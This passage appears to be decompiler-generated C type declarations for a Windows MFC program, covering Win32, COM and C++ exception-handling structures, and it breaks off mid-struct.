typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct CDC CDC, *PCDC;

struct CDC { // PlaceHolder Class Structure
};

typedef struct CWinThread CWinThread, *PCWinThread;

struct CWinThread { // PlaceHolder Class Structure
};

typedef struct CStatic CStatic, *PCStatic;

struct CStatic { // PlaceHolder Class Structure
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef struct CDWordArray CDWordArray, *PCDWordArray;

struct CDWordArray { // PlaceHolder Class Structure
};

typedef struct CString CString, *PCString;

struct CString { // PlaceHolder Class Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct CWinApp CWinApp, *PCWinApp;

struct CWinApp { // PlaceHolder Class Structure
};

typedef struct CListCtrl CListCtrl, *PCListCtrl;

struct CListCtrl { // PlaceHolder Class Structure
};

typedef struct CBrush CBrush, *PCBrush;

struct CBrush { // PlaceHolder Class Structure
};

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char[0] name;
};

typedef struct CCmdTarget CCmdTarget, *PCCmdTarget;

struct CCmdTarget { // PlaceHolder Class Structure
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef int ptrdiff_t;

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
};

typedef struct CProgressCtrl CProgressCtrl, *PCProgressCtrl;

struct CProgressCtrl { // PlaceHolder Class Structure
};

typedef struct CButton CButton, *PCButton;

struct CButton { // PlaceHolder Class Structure
};

typedef struct CRichEditCtrl CRichEditCtrl, *PCRichEditCtrl;

struct CRichEditCtrl { // PlaceHolder Class Structure
};

typedef struct CPaintDC CPaintDC, *PCPaintDC;

struct CPaintDC { // PlaceHolder Class Structure
};

typedef struct CClientDC CClientDC, *PCClientDC;

struct CClientDC { // PlaceHolder Class Structure
};

typedef struct CRect CRect, *PCRect;

struct CRect { // PlaceHolder Class Structure
};

typedef struct CRgn CRgn, *PCRgn;

struct CRgn { // PlaceHolder Class Structure
};

typedef struct CDialog CDialog, *PCDialog;

struct CDialog { // PlaceHolder Class Structure
};

typedef struct CWnd CWnd, *PCWnd;

struct CWnd { // PlaceHolder Class Structure
};

typedef struct CComboBox CComboBox, *PCComboBox;

struct CComboBox { // PlaceHolder Class Structure
};

typedef struct CBitmap CBitmap, *PCBitmap;

struct CBitmap { // PlaceHolder Class Structure
};

typedef struct CFile CFile, *PCFile;

struct CFile { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct CObject CObject, *PCObject;

struct CObject { // PlaceHolder Class Structure
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef struct _SECURITY_ATTRIBUTES SECURITY_ATTRIBUTES;

typedef ulong DWORD;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _TIME_ZONE_INFORMATION _TIME_ZONE_INFORMATION, *P_TIME_ZONE_INFORMATION;

typedef long LONG;

typedef wchar_t WCHAR;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _TIME_ZONE_INFORMATION {
    LONG Bias;
    WCHAR StandardName[32];
    SYSTEMTIME StandardDate;
    LONG StandardBias;
    WCHAR DaylightName[32];
    SYSTEMTIME DaylightDate;
    LONG DaylightBias;
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW * LPWIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef char CHAR;

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef CHAR * LPSTR;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef DWORD (* PTHREAD_START_ROUTINE)(LPVOID);

typedef struct _TIME_ZONE_INFORMATION TIME_ZONE_INFORMATION;

typedef struct _TIME_ZONE_INFORMATION * LPTIME_ZONE_INFORMATION;

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _WIN32_FIND_DATAA * LPWIN32_FIND_DATAA;

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _SYSTEMTIME * LPSYSTEMTIME;

typedef DWORD ULONG;

typedef WORD CLIPFORMAT;

typedef WCHAR OLECHAR;

typedef OLECHAR * LPOLESTR;

typedef void * HMETAFILEPICT;

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

typedef struct _s_CatchableType CatchableType;
// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

typedef struct PMD PMD, *PPMD;

typedef void (* PMFN)(void *);

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor * pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *[0] arrayOfCatchableTypes;
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (* pForwardCompat)(void);
    CatchableTypeArray * pCatchableTypeArray;
};

typedef struct _tagBINDINFO _tagBINDINFO, *P_tagBINDINFO;

typedef struct _tagBINDINFO BINDINFO;

typedef WCHAR * LPWSTR;

typedef struct tagSTGMEDIUM tagSTGMEDIUM, *PtagSTGMEDIUM;

typedef struct tagSTGMEDIUM uSTGMEDIUM;

typedef uSTGMEDIUM STGMEDIUM;

typedef struct _GUID _GUID, *P_GUID;

typedef struct _GUID GUID;

typedef GUID IID;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef union _union_2260 _union_2260, *P_union_2260;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef long HRESULT;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

typedef struct HBITMAP__ * HBITMAP;

typedef struct HENHMETAFILE__ HENHMETAFILE__, *PHENHMETAFILE__;

typedef struct HENHMETAFILE__ * HENHMETAFILE;

typedef HANDLE HGLOBAL;

typedef struct IStream IStream, *PIStream;

typedef struct IStorage IStorage, *PIStorage;

typedef struct IStreamVtbl IStreamVtbl, *PIStreamVtbl;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef union _ULARGE_INTEGER _ULARGE_INTEGER, *P_ULARGE_INTEGER;

typedef union _ULARGE_INTEGER ULARGE_INTEGER;

typedef struct tagSTATSTG tagSTATSTG, *PtagSTATSTG;

typedef struct tagSTATSTG STATSTG;

typedef struct IStorageVtbl IStorageVtbl, *PIStorageVtbl;

typedef LPOLESTR * SNB;

typedef struct IEnumSTATSTG IEnumSTATSTG, *PIEnumSTATSTG;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

typedef struct _struct_22 _struct_22, *P_struct_22;

typedef struct _struct_23 _struct_23, *P_struct_23;

typedef double ULONGLONG;

typedef GUID CLSID;

typedef struct IEnumSTATSTGVtbl IEnumSTATSTGVtbl, *PIEnumSTATSTGVtbl;

struct IStreamVtbl {
    HRESULT (* QueryInterface)(struct IStream *, IID *, void * *);
    ULONG (* AddRef)(struct IStream *);
    ULONG (* Release)(struct IStream *);
    HRESULT (* Read)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (* Write)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (* Seek)(struct IStream *, LARGE_INTEGER, DWORD, ULARGE_INTEGER *);
    HRESULT (* SetSize)(struct IStream *, ULARGE_INTEGER);
    HRESULT (* CopyTo)(struct IStream *, struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER *, ULARGE_INTEGER *);
    HRESULT (* Commit)(struct IStream *, DWORD);
    HRESULT (* Revert)(struct IStream *);
    HRESULT (* LockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (* UnlockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (* Stat)(struct IStream *, STATSTG *, DWORD);
    HRESULT (* Clone)(struct IStream *, struct IStream * *);
};

union _union_2260 {
    HBITMAP hBitmap;
    HMETAFILEPICT hMetaFilePict;
    HENHMETAFILE hEnhMetaFile;
    HGLOBAL hGlobal;
    LPOLESTR lpszFileName;
    struct IStream * pstm;
    struct IStorage * pstg;
};

struct IStorageVtbl {
    HRESULT (* QueryInterface)(struct IStorage *, IID *, void * *);
    ULONG (* AddRef)(struct IStorage *);
    ULONG (* Release)(struct IStorage *);
    HRESULT (* CreateStream)(struct IStorage *, OLECHAR *, DWORD, DWORD, DWORD, struct IStream * *);
    HRESULT (* OpenStream)(struct IStorage *, OLECHAR *, void *, DWORD, DWORD, struct IStream * *);
    HRESULT (* CreateStorage)(struct IStorage *, OLECHAR *, DWORD, DWORD, DWORD, struct IStorage * *);
    HRESULT (* OpenStorage)(struct IStorage *, OLECHAR *, struct IStorage *, DWORD, SNB, DWORD, struct IStorage * *);
    HRESULT (* CopyTo)(struct IStorage *, DWORD, IID *, SNB, struct IStorage *);
    HRESULT (* MoveElementTo)(struct IStorage *, OLECHAR *, struct IStorage *, OLECHAR *, DWORD);
    HRESULT (* Commit)(struct IStorage *, DWORD);
    HRESULT (* Revert)(struct IStorage *);
    HRESULT (* EnumElements)(struct IStorage *, DWORD, void *, DWORD, struct IEnumSTATSTG * *);
    HRESULT (* DestroyElement)(struct IStorage *, OLECHAR *);
    HRESULT (* RenameElement)(struct IStorage *, OLECHAR *, OLECHAR *);
    HRESULT (* SetElementTimes)(struct IStorage *, OLECHAR *, FILETIME *, FILETIME *, FILETIME *);
    HRESULT (* SetClass)(struct IStorage *, IID *);
    HRESULT (* SetStateBits)(struct IStorage *, DWORD, DWORD);
    HRESULT (* Stat)(struct IStorage *, STATSTG *, DWORD);
};

struct IStream {
    struct IStreamVtbl * lpVtbl;
};

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

struct IStorage {
    struct IStorageVtbl * lpVtbl;
};

struct IEnumSTATSTGVtbl {
    HRESULT (* QueryInterface)(struct IEnumSTATSTG *, IID *, void * *);
    ULONG (* AddRef)(struct IEnumSTATSTG *);
    ULONG (* Release)(struct IEnumSTATSTG *);
    HRESULT (* Next)(struct IEnumSTATSTG *, ULONG, STATSTG *, ULONG *);
    HRESULT (* Skip)(struct IEnumSTATSTG *, ULONG);
    HRESULT (* Reset)(struct IEnumSTATSTG *);
    HRESULT (* Clone)(struct IEnumSTATSTG *, struct IEnumSTATSTG * *);
};

struct tagSTGMEDIUM {
    DWORD tymed;
    union _union_2260 u;
    struct IUnknown * pUnkForRelease;
};

struct HBITMAP__ {
    int unused;
};

struct IEnumSTATSTG {
    struct IEnumSTATSTGVtbl * lpVtbl;
};

struct _struct_23 {
    DWORD LowPart;
    DWORD HighPart;
};

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

struct IUnknownVtbl {
    HRESULT (* QueryInterface)(struct IUnknown *, IID *, void * *);
    ULONG (* AddRef)(struct IUnknown *);
    ULONG (* Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl * lpVtbl;
};

struct _struct_22 {
    DWORD LowPart;
    DWORD HighPart;
};

union _ULARGE_INTEGER {
    struct _struct_22 s;
    struct _struct_23 u;
    ULONGLONG QuadPart;
};

struct HENHMETAFILE__ {
    int unused;
};

struct _tagBINDINFO {
    ULONG cbSize;
    LPWSTR szExtraInfo;
    STGMEDIUM stgmedData;
    DWORD grfBindInfoF;
    DWORD dwBindVerb;
    LPWSTR szCustomVerb;
    DWORD cbstgmedData;
    DWORD dwOptions;
    DWORD dwOptionsFlags;
    DWORD dwCodePage;
    SECURITY_ATTRIBUTES securityAttributes;
    IID iid;
    struct IUnknown * pUnk;
    DWORD dwReserved;
};

struct tagSTATSTG {
    LPOLESTR pwcsName;
    DWORD type;
    ULARGE_INTEGER cbSize;
    FILETIME mtime;
    FILETIME ctime;
    FILETIME atime;
    DWORD grfMode;
    DWORD grfLocksSupported;
    CLSID clsid;
    DWORD grfStateBits;
    DWORD reserved;
};

typedef struct IBindStatusCallback IBindStatusCallback, *PIBindStatusCallback;

typedef struct IBindStatusCallbackVtbl IBindStatusCallbackVtbl, *PIBindStatusCallbackVtbl;

typedef struct IBinding IBinding, *PIBinding;

typedef WCHAR * LPCWSTR;

typedef struct tagFORMATETC tagFORMATETC, *PtagFORMATETC;

typedef struct tagFORMATETC FORMATETC;

typedef struct IBindingVtbl IBindingVtbl, *PIBindingVtbl;

typedef struct tagDVTARGETDEVICE tagDVTARGETDEVICE, *PtagDVTARGETDEVICE;

typedef struct tagDVTARGETDEVICE DVTARGETDEVICE;

struct IBindStatusCallback {
    struct IBindStatusCallbackVtbl * lpVtbl;
};

struct tagFORMATETC {
    CLIPFORMAT cfFormat;
    DVTARGETDEVICE * ptd;
    DWORD dwAspect;
    LONG lindex;
    DWORD tymed;
};

struct IBinding {
    struct IBindingVtbl * lpVtbl;
};

struct IBindStatusCallbackVtbl {
    HRESULT (* QueryInterface)(struct IBindStatusCallback *, IID *, void * *);
    ULONG (* AddRef)(struct IBindStatusCallback *);
    ULONG (* Release)(struct IBindStatusCallback *);
    HRESULT (* OnStartBinding)(struct IBindStatusCallback *, DWORD, struct IBinding *);
    HRESULT (* GetPriority)(struct IBindStatusCallback *, LONG *);
    HRESULT (* OnLowResource)(struct IBindStatusCallback *, DWORD);
    HRESULT (* OnProgress)(struct IBindStatusCallback *, ULONG, ULONG, ULONG, LPCWSTR);
    HRESULT (* OnStopBinding)(struct IBindStatusCallback *, HRESULT, LPCWSTR);
    HRESULT (* GetBindInfo)(struct IBindStatusCallback *, DWORD *, BINDINFO *);
    HRESULT (* OnDataAvailable)(struct IBindStatusCallback *, DWORD, DWORD, FORMATETC *, STGMEDIUM *);
    HRESULT (* OnObjectAvailable)(struct IBindStatusCallback *, IID *, struct IUnknown *);
};

struct IBindingVtbl {
    HRESULT (* QueryInterface)(struct IBinding *, IID *, void * *);
    ULONG (* AddRef)(struct IBinding *);
    ULONG (* Release)(struct IBinding *);
    HRESULT (* Abort)(struct IBinding *);
    HRESULT (* Suspend)(struct IBinding *);
    HRESULT (* Resume)(struct IBinding *);
    HRESULT (* SetPriority)(struct IBinding *, LONG);
    HRESULT (* GetPriority)(struct IBinding *, LONG *);
    HRESULT (* GetBindResult)(struct IBinding *, CLSID *, DWORD *, LPOLESTR *, DWORD *);
};

struct tagDVTARGETDEVICE {
    DWORD tdSize;
    WORD tdDriverNameOffset;
    WORD tdDeviceNameOffset;
    WORD tdPortNameOffset;
    WORD tdExtDevmodeOffset;
    BYTE tdData[1];
};

typedef struct IBindStatusCallback * LPBINDSTATUSCALLBACK;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ * HDC;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef BOOL (* GRAYSTRINGPROC)(HDC, LPARAM, int);

struct HDC__ {
    int unused;
};

typedef struct tagTRACKMOUSEEVENT tagTRACKMOUSEEVENT, *PtagTRACKMOUSEEVENT;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

struct tagTRACKMOUSEEVENT {
    DWORD cbSize;
    DWORD dwFlags;
    HWND hwndTrack;
    DWORD dwHoverTime;
};

struct HWND__ {
    int unused;
};

typedef uint UINT;

typedef uint UINT_PTR;

typedef void (* TIMERPROC)(HWND, UINT, UINT_PTR, DWORD);

typedef struct tagTRACKMOUSEEVENT * LPTRACKMOUSEEVENT;

typedef struct basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_> basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_>, *Pbasic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_>;

struct basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_> { // PlaceHolder Class Structure
};

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef struct CDocument CDocument, *PCDocument;

struct CDocument { // PlaceHolder Structure
};

typedef struct AFX_OLECMDMAP AFX_OLECMDMAP, *PAFX_OLECMDMAP;

struct AFX_OLECMDMAP { // PlaceHolder Structure
};

typedef struct AFX_MODULE_STATE AFX_MODULE_STATE, *PAFX_MODULE_STATE;

struct AFX_MODULE_STATE { // PlaceHolder Structure
};

typedef struct CTypeLibCache CTypeLibCache, *PCTypeLibCache;

struct CTypeLibCache { // PlaceHolder Structure
};

typedef struct CDataExchange CDataExchange, *PCDataExchange;

struct CDataExchange { // PlaceHolder Structure
};

typedef struct AFX_EVENTSINKMAP AFX_EVENTSINKMAP, *PAFX_EVENTSINKMAP;

struct AFX_EVENTSINKMAP { // PlaceHolder Structure
};

typedef struct COccManager COccManager, *PCOccManager;

struct COccManager { // PlaceHolder Structure
};

typedef struct tagTOOLINFOA tagTOOLINFOA, *PtagTOOLINFOA;

struct tagTOOLINFOA { // PlaceHolder Structure
};

typedef struct AFX_CMDHANDLERINFO AFX_CMDHANDLERINFO, *PAFX_CMDHANDLERINFO;

struct AFX_CMDHANDLERINFO { // PlaceHolder Structure
};

typedef struct AFX_CONNECTIONMAP AFX_CONNECTIONMAP, *PAFX_CONNECTIONMAP;

struct AFX_CONNECTIONMAP { // PlaceHolder Structure
};

typedef struct _charformat _charformat, *P_charformat;

struct _charformat { // PlaceHolder Structure
};

typedef struct COleControlSite COleControlSite, *PCOleControlSite;

struct COleControlSite { // PlaceHolder Structure
};

typedef struct CScrollBar CScrollBar, *PCScrollBar;

struct CScrollBar { // PlaceHolder Structure
};

typedef struct CRuntimeClass CRuntimeClass, *PCRuntimeClass;

struct CRuntimeClass { // PlaceHolder Structure
};

typedef struct tagMEASUREITEMSTRUCT tagMEASUREITEMSTRUCT, *PtagMEASUREITEMSTRUCT;

struct tagMEASUREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct CSize CSize, *PCSize;

struct CSize { // PlaceHolder Structure
};

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

struct tagVARIANT { // PlaceHolder Structure
};

typedef struct tagCOMPAREITEMSTRUCT tagCOMPAREITEMSTRUCT, *PtagCOMPAREITEMSTRUCT;

struct tagCOMPAREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct IConnectionPoint IConnectionPoint, *PIConnectionPoint;

struct IConnectionPoint { // PlaceHolder Structure
};

typedef struct AFX_DISPMAP AFX_DISPMAP, *PAFX_DISPMAP;

struct AFX_DISPMAP { // PlaceHolder Structure
};

typedef struct _AFX_OCC_DIALOG_INFO _AFX_OCC_DIALOG_INFO, *P_AFX_OCC_DIALOG_INFO;

struct _AFX_OCC_DIALOG_INFO { // PlaceHolder Structure
};

typedef struct AFX_INTERFACEMAP AFX_INTERFACEMAP, *PAFX_INTERFACEMAP;

struct AFX_INTERFACEMAP { // PlaceHolder Structure
};

typedef struct tagCREATESTRUCTA tagCREATESTRUCTA, *PtagCREATESTRUCTA;

struct tagCREATESTRUCTA { // PlaceHolder Structure
};

typedef struct AFX_MSGMAP AFX_MSGMAP, *PAFX_MSGMAP;

struct AFX_MSGMAP { // PlaceHolder Structure
};

typedef struct tagDELETEITEMSTRUCT tagDELETEITEMSTRUCT, *PtagDELETEITEMSTRUCT;

struct tagDELETEITEMSTRUCT { // PlaceHolder Structure
};

typedef struct CPtrArray CPtrArray, *PCPtrArray;

struct CPtrArray { // PlaceHolder Structure
};

typedef struct CGdiObject CGdiObject, *PCGdiObject;

struct CGdiObject { // PlaceHolder Structure
};

typedef struct tagDRAWITEMSTRUCT tagDRAWITEMSTRUCT, *PtagDRAWITEMSTRUCT;

struct tagDRAWITEMSTRUCT { // PlaceHolder Structure
};

typedef struct ITypeLib ITypeLib, *PITypeLib;

struct ITypeLib { // PlaceHolder Structure
};

typedef struct CException CException, *PCException;

struct CException { // PlaceHolder Structure
};

typedef struct CCreateContext CCreateContext, *PCCreateContext;

struct CCreateContext { // PlaceHolder Structure
};

typedef struct CFont CFont, *PCFont;

struct CFont { // PlaceHolder Structure
};

typedef struct tagMSG tagMSG, *PtagMSG;

struct tagMSG { // PlaceHolder Structure
};

typedef struct CPoint CPoint, *PCPoint;

struct CPoint { // PlaceHolder Structure
};

typedef int (* _onexit_t)(void);

typedef DWORD LCTYPE;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
